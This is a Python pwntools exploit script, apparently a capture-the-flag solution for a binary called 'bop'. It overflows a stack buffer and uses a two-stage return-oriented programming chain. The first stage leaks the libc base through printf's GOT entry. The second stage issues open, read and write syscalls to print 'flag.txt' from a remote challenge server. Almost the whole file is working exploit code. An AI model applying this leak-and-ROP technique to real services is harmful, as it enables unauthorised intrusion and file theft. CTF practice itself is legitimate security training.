#!/usr/bin/python2

from pwn import *

exe = ELF("bop_patched")

context.binary = exe
sla = lambda r,a,b : r.sendlineafter(a,b)
sl = lambda r,a : r.sendline(a)
ru = lambda r,a : r.recvuntil(a)

rdi = 0x00000000004013d3#: pop rdi; ret;
rsi = 0x00000000004013d1#: pop rsi; pop r15; ret;
prep = 0x00000000004013cc#: pop r12; pop r13; pop r14; pop r15; ret;
exchange = 0x000000000005b622#: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret;
rdx = 0x0000000000142c92#: pop rdx; ret;
rcx = 0x000000000010257e#: pop rcx; pop rbx; ret;
rax = 0x0000000000036174#: pop rax; ret;
syscall_ret = 0x00000000000630a9#: syscall; ret;
syscall_only = 0x000000000002284d#: syscall;
xor_r10 = 0x000000000013efe0#: xor r10d, r10d; mov eax, r10d; ret;
entry = 0x00401130
restart = 0x004012f9
printf_got = 0x00404038
printf_plt = 0x004010f4
one_gadget = 0xe3afe
pritf_offset_libc = 0x3FC90+0x22000
system_offset_libc = 0x52290
open_offset_libc = 0x10DCE0
read_libc = 0x10DFC0
bin_sh = 0x1B45BD

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 12345)
        r = remote("mc.ax", 30284)

    return r

def trigger(r, chain):
    payload = "A"*40
    payload += chain
    sl(r, payload)

def main():
    r = conn()
    ru(r, "? ")
    chain = p64(rdi)
    chain += p64(printf_got)
    chain += p64(rsi)
    chain += p64(0)
    chain += p64(0)
    chain += p64(printf_plt)
    chain += p64(rdi)
    chain += p64(printf_got)
    chain += p64(rsi)
    chain += p64(0)
    chain += p64(0)
    chain += p64(0x004012f9)
    #gdb.attach(r)
    trigger(r, chain)

    libc_base = u64(r.recv(6) + "\x00\x00") - pritf_offset_libc
    log.info("LIBC BASE: {}".format(hex(libc_base)))

    print hex(libc_base+one_gadget)
    chain = "A"*40
    chain += p64(rdi)
    chain += p64(printf_got+0x100)
    chain += p64(0x00401104) # call gets to overwrite the thing
    #chain += p64(0x00401348)
    chain += p64(rsi)
    chain += p64(0)
    chain += p64(0)
    chain += p64(rdi)
    chain += p64(printf_got+0x100)
    #chain += p64(libc_base+rdx)
    #chain += p64(0)
    chain += p64(libc_base+rax)
    chain += p64(2)
    chain += p64(libc_base+syscall_ret)
    chain += p64(libc_base+rdx)
    chain += p64(0)
    chain += p64(libc_base+rcx)
    chain += p64(1)
    chain += p64(0)
    chain += p64(libc_base+exchange)
    chain += p64(rsi)
    chain += p64(printf_got+0x200)
    chain += p64(0)
    chain += p64(libc_base+rdx)
    chain += p64(90)
    chain += p64(libc_base+rax)
    chain += p64(0)
    chain += p64(libc_base+syscall_ret)
    chain += p64(rdi)
    chain += p64(1)
    chain += p64(rsi)
    chain += p64(printf_got+0x200)
    chain += p64(0)
    chain += p64(libc_base+rax)
    chain += p64(1)
    chain += p64(libc_base+syscall_ret)

    sl(r,chain)

    file = "flag.txt"
    sl(r, file)

    #payload = p64(libc_base + open_offset_libc)
    #sl(r, payload)

    r.interactive()



if __name__ == "__main__":
    main()
